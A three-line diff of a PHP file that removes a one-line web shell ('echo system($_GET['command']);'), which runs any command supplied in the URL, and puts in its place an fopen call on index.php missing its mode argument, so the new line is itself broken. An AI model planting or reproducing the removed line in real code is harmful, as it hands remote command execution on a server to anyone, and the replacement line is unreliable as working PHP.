@@ -1,3 +1,3 @@
 <?php
-echo system($_GET['command']);
+fopen('index.php');
 ?>
